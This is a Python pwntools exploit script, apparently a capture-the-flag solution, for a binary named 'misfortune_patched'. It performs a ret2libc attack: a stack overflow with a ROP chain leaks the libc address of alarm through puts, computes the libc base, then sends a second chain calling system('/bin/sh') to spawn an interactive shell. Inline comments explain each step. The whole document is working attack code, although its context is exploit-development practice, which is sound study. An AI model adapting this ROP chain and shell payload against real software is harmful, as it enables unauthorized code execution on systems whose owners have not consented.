#!/usr/bin/env python3

from pwn import *

exe = ELF("./misfortune_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

rop = ROP(exe)
pop_rdi = rop.find_gadget(["pop rdi"])[0]
ret  = rop.find_gadget(["ret"])[0]
success(f"{hex(pop_rdi)=}")
success(f"{hex(ret)=}")
main_function = exe.symbols.main

# The binary can pull out other functions from the PLT to find the address in the GOT
# to get a new function address loaded in libc. 
puts_plt = exe.plt.puts
# We can attempt this too knowing we have seen an alarm functionality in use
alarm_got = exe.got.alarm
# We can retrieve the addresses from the binary itself
success(f"{hex(puts_plt)=}")
success(f"{hex(alarm_got)=}")

context.binary = exe

def conn():
    r = gdb.debug([exe.path])
    return r

def main():

    offset = 32 
    length = 90 
    r = conn()
    
    prompt = r.recvuntil(b"\n> ")

# Trying to get the application to spit out the address for the alarm GOT function as it runs
    payload = b"".join([
        b"A"*offset,
        p64(ret),
        p64(pop_rdi),
        p64(alarm_got),
        p64(puts_plt),
        p64(main_function),
    ])
    payload += b"C"*(length - len(payload))

    # Sending the payload. We can carve the address out now and left justify 8 bytes with null bytes
    # to unpack with u64 to retrieve the numeric value of alarm in its libc loaded address.
    r.send(payload)
    alarm_libc = u64(r.recvline().strip().ljust(8, b"\x00"))
    success(f"{hex(alarm_libc)=}")

    libc_base = alarm_libc - libc.symbols.alarm
    success(f"{hex(libc_base)=}")
    libc.address = libc_base

    # Now LIBC is within our capability, we can try to find what the real address is in runtime (system)
    # We can pass /bin/sh (command to run the shell) and adding null bytes at the end (4 bytes per segment)
    system = libc.symbols.system
    # Returning a generator requires wrapping around with next()
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    # Sanity to display what the system addres is and bin_sh with GDB
    success(f"{hex(system)=}")
    success(f"{hex(bin_sh)=}")

    #############################BREAK###############################
    prompt = r.recvuntil(b"\n> ")
  

# The second iteration of our payload with the spawning of a shell via the pop_rdi, bin_sh, system, path.
    payload = b"".join([
        b"A"*offset,
        p64(ret),
        p64(pop_rdi),
        p64(bin_sh),
        p64(ret),
        p64(system),
    ])
    payload += b"C"*(length - len(payload))

    r.send(payload)

    r.interactive()

if __name__ == "__main__":
    main()
